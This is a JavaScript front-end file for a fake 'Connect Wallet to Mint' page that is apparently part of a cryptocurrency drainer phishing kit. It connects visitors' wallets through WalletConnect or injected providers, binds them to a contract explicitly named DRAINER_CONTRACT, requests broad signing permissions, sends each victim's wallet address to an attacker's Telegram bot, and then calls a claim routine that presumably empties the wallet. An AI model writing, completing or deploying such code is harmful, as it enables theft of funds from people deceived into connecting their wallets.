import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ======================================================================
   * CONFIG
   * ==================================================================== */
  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  // Validate projectId up front — fail loudly rather than silently
  if (!PROJECT_ID || !/^[0-9a-f]{32}$/i.test(PROJECT_ID)) {
    console.error('[main.js] Invalid WalletConnect PROJECT_ID:', PROJECT_ID);
    console.error('[main.js] Register at https://cloud.reown.com and copy the 32-char hex projectId.');
  }

  const RELAY_URL = 'wss://relay.walletconnect.com';

  /* ======================================================================
   * METADATA — always align URL with the actual origin so the WC domain
   * allowlist matches at runtime. If you deploy to a domain that isn't in
   * the allowlist, WC will reject the handshake with 403. The fix is to
   * add the domain to cloud.reown.com, not to spoof it here — but this
   * runtime override ensures we at least SEND the correct URL.
   * ==================================================================== */
  const RUNTIME_METADATA = {
    ...DAPP_METADATA,
    url: window.location.origin,
    icons: DAPP_METADATA.icons?.length
      ? DAPP_METADATA.icons
      : [window.location.origin + '/favicon.ico'],
  };

  /* ======================================================================
   * PLATFORM
   * ==================================================================== */
  const UA = navigator.userAgent || '';
  const isIOS         = /iPhone|iPad|iPod/i.test(UA);
  const isAndroid     = /Android/i.test(UA);
  const isMobile      = isIOS || isAndroid;
  const isDesktop     = !isMobile;

  /* ======================================================================
   * DEBUG PANEL
   * ==================================================================== */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position:fixed;bottom:0;left:0;width:100%;background:#000;color:#0f0;
    font-size:12px;padding:5px;z-index:10000;max-height:180px;
    overflow-y:auto;display:none;font-family:monospace;`;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function log(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  function logErr(msg, err) {
    const detail = err ? ` — ${err.message || err}` : '';
    log(`❌ ${msg}${detail}`);
    if (err?.stack) console.error(err);
  }

  /* ======================================================================
   * HELPERS
   * ==================================================================== */
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);
  }
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* ======================================================================
   * TELEGRAM
   * ==================================================================== */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
  async function sendTelegram(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch { return false; }
  }
  window.testTelegram = (m) => sendTelegram(m || ('🧪 ' + new Date().toISOString()));

  /* ======================================================================
   * LIBRARY LOADER
   * ==================================================================== */
  async function tryImport(urls, pickFn, label, timeoutMs = 12000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(/* @vite-ignore */ url), timeoutMs, `${label}@${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export missing at ${url}`);
        log(`✅ ${label} (${(performance.now() - t0).toFixed(0)}ms) from ${url}`);
        return v;
      } catch (e) {
        lastErr = e;
        log(`❌ ${label} fail ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadLibs() {
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdns = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, Web3Mod] = await Promise.all([
      tryImport(providerCdns, (m) => m.EthereumProvider || m.default?.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdns, (m) => m.default?.Web3 || m.default || m.Web3 || m, 'Web3'),
    ]);

    return {
      EthereumProvider,
      Web3: Web3Mod?.default || Web3Mod,
    };
  }

  /* ======================================================================
   * DOM
   * ==================================================================== */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ======================================================================
   * STATE
   * ==================================================================== */
  let EthereumProvider = null;
  let Web3Ctor = null;

  let wcProvider       = null;
  let injectedProvider = null;
  let activeProvider   = null;
  let web3             = null;
  let contract         = null;
  let connectionMode   = null;   // 'walletconnect' | 'injected'
  let connectedAddr    = null;

  let isConnecting     = false;
  let isDisconnecting  = false;
  let suppressAccountEvents = false;  // ← guard during enable()

  /* ======================================================================
   * UI HELPERS
   * ==================================================================== */
  function setButtonState(btn, state) {
    if (!btn) return;
    btn.style.display      = 'inline-block';
    btn.style.padding      = '14px 28px';
    btn.style.borderRadius = '8px';
    btn.style.fontWeight   = '600';
    btn.style.border       = 'none';
    btn.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    btn.style.color        = 'white';
    btn.style.fontSize     = '16px';
    btn.style.minWidth     = '180px';
    btn.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        btn.style.background = 'linear-gradient(135deg,#666,#888)';
        btn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        btn.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        btn.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        btn.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        btn.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        btn.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        btn.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(btn, 'normal'), 3000);
        break;
      default:
        btn.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        btn.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ======================================================================
   * STORAGE
   * ==================================================================== */
  function saveWallet(addr, mode) {
    try {
      localStorage.setItem('connectedWallet', addr);
      if (mode) localStorage.setItem('connectionMode', mode);
    } catch {}
  }
  function getSavedWallet()  { try { return localStorage.getItem('connectedWallet'); } catch { return null; } }
  function getSavedMode()    { try { return localStorage.getItem('connectionMode'); } catch { return null; } }
  function clearSavedWallet(){ try {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('connectionMode');
  } catch {} }

  /* ======================================================================
   * GLOBAL PUBLISH — this is what script.js reads
   * ==================================================================== */
  async function publishGlobalState(address, chain) {
    // Liveness probe: don't publish a dead provider
    let live = activeProvider;
    if (live) {
      try {
        await withTimeout(live.request({ method: 'eth_chainId' }), 4000, 'provider-probe');
      } catch (e) {
        logErr('active provider failed liveness probe', e);
        live = null;
      }
    }
    // Fall back to injected if WC provider is dead
    if (!live && window.ethereum) {
      try {
        const acc = await withTimeout(
          window.ethereum.request({ method: 'eth_accounts' }),
          4000, 'injected-probe'
        );
        if (acc && acc.length) live = window.ethereum;
      } catch {}
    }

    window.__apexConnected = {
      address,
      chain,
      web3,
      contract,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    log(`publish: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ======================================================================
   * CONNECTED UI
   * ==================================================================== */
  function updateConnectedUI(address, chain = 'evm') {
    connectedAddr = address;
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px;padding:10px 16px;font-family:'JetBrains Mono',monospace;
        font-size:14px;color:#059669;text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px;border:1px solid #A7F3D0;`;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegram(`
🔗 <b>Wallet Connected</b>
📌 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
    `.trim());
  }

  function resetConnectedUI() {
    connectedAddr = null;
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3 = null;
    contract = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  /* ======================================================================
   * EIP-6963
   * ==================================================================== */
  let evmProviders = [];
  let eip6963Init = false;
  function setupEIP6963() {
    if (eip6963Init) return;
    eip6963Init = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        log(`EIP-6963: ${d.info.name}`);
      }
    });
    const req = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    req(); setTimeout(req, 500); setTimeout(req, 1500);
  }

  /* ======================================================================
   * IN-WALLET BROWSER DETECTION
   * ==================================================================== */
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isTrust || eth.isTrustWallet || /TrustWallet|Trust\s*Wallet/i.test(UA)) {
      return { wallet: 'trust', name: 'Trust Wallet' };
    }
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (eth.isRabby || /Rabby/i.test(UA)) return { wallet: 'rabby', name: 'Rabby' };
    return null;
  }

  /* ======================================================================
   * WALLETCONNECT — the ONLY correct flow
   *
   * 1. Init EthereumProvider with optionalChains only + showQrModal true.
   * 2. Register display_uri handler BEFORE init (in case it fires early).
   * 3. Call provider.connect() — not enable() — for better error surfaces.
   * 4. Suppress accountsChanged during connect to avoid race.
   * 5. Validate the session with a live eth_accounts probe.
   * ==================================================================== */
  async function initWC() {
    if (wcProvider) {
      log('♻️ reusing WC provider');
      return wcProvider;
    }
    if (!EthereumProvider) throw new Error('EthereumProvider library not loaded');
    if (!PROJECT_ID) throw new Error('PROJECT_ID not configured in config.js');

    log(`WC init: projectId=${PROJECT_ID.slice(0,8)}… metadata.url=${RUNTIME_METADATA.url}`);

    try {
      const t0 = performance.now();
      wcProvider = await withTimeout(
        EthereumProvider.init({
          projectId: PROJECT_ID,
          // ── CRITICAL: optionalChains ONLY. Never chains + optionalChains.
          optionalChains: [MAINNET_ID],
          showQrModal: true,
          rpcMap: {
            [MAINNET_ID]: 'https://cloudflare-eth.com',
          },
          metadata: RUNTIME_METADATA,
          relayUrl: RELAY_URL,
          // Modern WalletConnect expects these to be declared.
          optionalMethods: [
            'eth_sendTransaction',
            'eth_signTransaction',
            'eth_sign',
            'personal_sign',
            'eth_signTypedData',
            'eth_signTypedData_v4',
          ],
        }),
        20000,
        'EthereumProvider.init'
      );

      // Attach persistent event handlers AFTER init, but with the
      // accountsChanged guard in place. The guard is lifted once
      // connect() resolves (see connectWC below).
      attachWCEvents(wcProvider);

      log(`✅ WC init OK (${(performance.now() - t0).toFixed(0)}ms)`);
      return wcProvider;
    } catch (e) {
      logErr('WC init failed', e);
      wcProvider = null;
      throw e;
    }
  }

  function attachWCEvents(provider) {
    if (!provider || provider.__eventsAttached) return;
    provider.__eventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      // Suppress during connect() — the accounts event fires mid-handshake
      if (suppressAccountEvents) {
        log('accountsChanged during handshake — suppressed');
        return;
      }
      log(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
        return;
      }
      connectedAddr = accounts[0];
      saveWallet(connectedAddr, 'walletconnect');
      updateConnectedUI(connectedAddr, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      log(`WC chainChanged: ${id}`);
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3) {
        contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm');
      }
    });

    provider.on('disconnect', (reason) => {
      log(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });
  }

  async function connectWC() {
    try {
      const provider = await initWC();

      // If a session exists AND is valid, don't reconnect
      if (provider.session) {
        try {
          const accounts = await withTimeout(
            provider.request({ method: 'eth_accounts' }),
            5000, 'session-probe'
          );
          if (accounts && accounts.length) {
            log('♻️ existing WC session valid');
            connectedAddr  = accounts[0];
            activeProvider = provider;
            connectionMode = 'walletconnect';
            web3     = new Web3Ctor(provider);
            contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(connectedAddr, 'walletconnect');
            updateConnectedUI(connectedAddr, 'evm');
            return connectedAddr;
          }
        } catch (e) {
          logErr('stale WC session — will reconnect', e);
        }
      }

      // Fresh connect
      showStatus('Opening wallet…', 'info');
      suppressAccountEvents = true;

      let accounts;
      try {
        // connect() is the modern API; on 2.11.0 it wraps enable() but
        // surfaces structured errors we can inspect.
        if (typeof provider.connect === 'function') {
          accounts = await withTimeout(
            provider.connect({ chains: [MAINNET_ID] }),
            180000,   // 3 min — Trust Wallet often takes 30-60s
            'WC connect'
          );
        } else {
          accounts = await withTimeout(provider.enable(), 180000, 'WC enable');
        }
      } catch (e) {
        suppressAccountEvents = false;
        throw e;
      } finally {
        // Give the wallet's accountsChanged event a moment to drain
        setTimeout(() => { suppressAccountEvents = false; }, 1000);
      }

      if (!accounts || accounts.length === 0) {
        // Try one more probe — some wallets resolve connect() before accounts
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_accounts' }),
            5000, 'post-connect-probe'
          );
        } catch {}
      }

      if (!accounts || accounts.length === 0) {
        throw new Error('Wallet connected but returned no accounts');
      }

      connectedAddr  = accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3     = new Web3Ctor(provider);
      contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(connectedAddr, 'walletconnect');
      updateConnectedUI(connectedAddr, 'evm');
      log(`✅ WC connected: ${connectedAddr}`);
      return connectedAddr;
    } catch (e) {
      logErr('connectWC', e);
      throw e;   // caller surfaces the message
    }
  }

  /* ======================================================================
   * INJECTED (Trust Wallet in-app browser, MetaMask extension, etc.)
   * ==================================================================== */
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__injectedAttached) return;
    provider.__injectedAttached = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        connectedAddr = accounts[0];
        saveWallet(connectedAddr, 'injected');
        updateConnectedUI(connectedAddr, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 800);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3) {
        contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm');
      }
    });

    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
  }

  async function connectInjected() {
    setupEIP6963();
    await sleep(400);

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (!providers.length && window.ethereum) {
      providers = [{ info: { name: inWallet?.name || 'Injected' }, provider: window.ethereum }];
    }
    if (!providers.length) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const meta = providers.find((p) => /metamask/i.test(p.info?.name || ''));
      chosen = meta || providers[0];
    }

    try {
      const provider = chosen.provider;
      // Retry once — mobile wallets sometimes swallow the first request
      let accounts = null;
      for (let i = 0; i < 2 && !accounts?.length; i++) {
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_requestAccounts' }),
            15000,
            'eth_requestAccounts'
          );
        } catch (e) {
          log(`eth_requestAccounts attempt ${i+1} failed: ${e.message}`);
          if (i === 0) await sleep(800);
        }
      }
      if (!accounts?.length) return null;

      connectedAddr  = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';
      web3     = new Web3Ctor(provider);
      contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(connectedAddr, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(connectedAddr, 'evm');
      log(`✅ Injected connected: ${connectedAddr}`);
      return connectedAddr;
    } catch (e) {
      logErr('connectInjected', e);
      return null;
    }
  }

  /* ======================================================================
   * HARD DISCONNECT
   * ==================================================================== */
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
        } catch (e) {
          logErr('WC disconnect', e);
        }
      }
      // Injected: revoke if possible
      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          });
        } catch {}
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3 = null;
      contract = null;
      connectionMode = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      log('🔌 Disconnected');
    }
  }

  /* ======================================================================
   * CONNECT DISPATCHER
   * ==================================================================== */
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;
    let lastError = null;

    try {
      const inWallet = detectInWalletBrowser();

      // Prefer injected ONLY inside a known wallet browser
      if (inWallet) {
        log(`📱 In-wallet browser: ${inWallet.name} → injected first`);
        address = await connectInjected();
      } else if (isDesktop && window.ethereum) {
        address = await connectInjected();
      }

      if (!address) {
        try {
          address = await connectWC();
        } catch (e) {
          lastError = e;
        }
      }
    } catch (e) {
      lastError = e;
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      // Surface the actual reason
      let msg = 'Connection failed';
      if (lastError) {
        const m = lastError.message || String(lastError);
        if (/user rejected|user closed|4001/i.test(m)) msg = 'Connection rejected in wallet';
        else if (/403|unauthorized|allowlist|domain/i.test(m)) msg = 'Domain not allowlisted — add it at cloud.reown.com';
        else if (/401|projectid/i.test(m)) msg = 'Invalid WalletConnect projectId — check config.js';
        else if (/timeout/i.test(m)) msg = 'Wallet did not respond — please try again';
        else msg = m.slice(0, 120);
      }
      showStatus(msg, 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      log(`❌ connectWallet final: ${msg}`);
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  /* ======================================================================
   * BUTTON WIRING
   * ==================================================================== */
  async function handleClick() {
    if (isConnecting || isDisconnecting) return;
    // Live-state check, not localStorage
    const live = !!(activeProvider || connectedAddr);
    if (live) await disconnectWallet();
    else {
      // Clear stale state
      clearSavedWallet();
      resetConnectedUI();
      await connectWallet();
    }
  }

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  /* ======================================================================
   * SESSION RESTORE
   * ==================================================================== */
  async function restoreSession() {
    const saved = getSavedWallet();
    const mode  = getSavedMode();
    if (!saved) return;

    // Try WC first if mode says so
    if (mode === 'walletconnect' || !mode) {
      try {
        const provider = await initWC();
        if (provider.session) {
          const accounts = await withTimeout(
            provider.request({ method: 'eth_accounts' }),
            5000, 'restore-probe'
          );
          if (accounts?.length) {
            connectedAddr  = accounts[0];
            activeProvider = provider;
            connectionMode = 'walletconnect';
            web3     = new Web3Ctor(provider);
            contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(connectedAddr, 'walletconnect');
            updateConnectedUI(connectedAddr, 'evm');
            log(`♻️ WC session restored: ${connectedAddr}`);
            return;
          }
        }
      } catch (e) {
        logErr('WC restore', e);
      }
    }

    // Try injected
    if ((mode === 'injected' || !mode) && window.ethereum) {
      try {
        const accounts = await withTimeout(
          window.ethereum.request({ method: 'eth_accounts' }),
          4000, 'injected-restore'
        );
        if (accounts?.length && accounts[0].toLowerCase() === saved.toLowerCase()) {
          injectedProvider = window.ethereum;
          activeProvider   = window.ethereum;
          connectionMode   = 'injected';
          connectedAddr    = accounts[0];
          web3     = new Web3Ctor(window.ethereum);
          contract = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(saved, 'injected');
          attachInjectedEvents(window.ethereum);
          updateConnectedUI(saved, 'evm');
          log(`♻️ Injected session restored: ${saved}`);
          return;
        }
      } catch (e) {
        logErr('injected restore', e);
      }
    }

    log('⚠️ No restorable session');
    clearSavedWallet();
  }

  /* ======================================================================
   * BOOT
   * ==================================================================== */
  try {
    const libs = await loadLibs();
    EthereumProvider = libs.EthereumProvider;
    Web3Ctor         = libs.Web3;
    log('✅ libraries loaded');

    setupEIP6963();

    // Give EIP-6963 time to announce, then try restore
    await sleep(400);
    await restoreSession();
  } catch (e) {
    logErr('boot fatal', e);
    showStatus('Failed to load wallet libraries — check console', 'error');
  }

  log(`✅ main.js ready — mobile=${isMobile}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
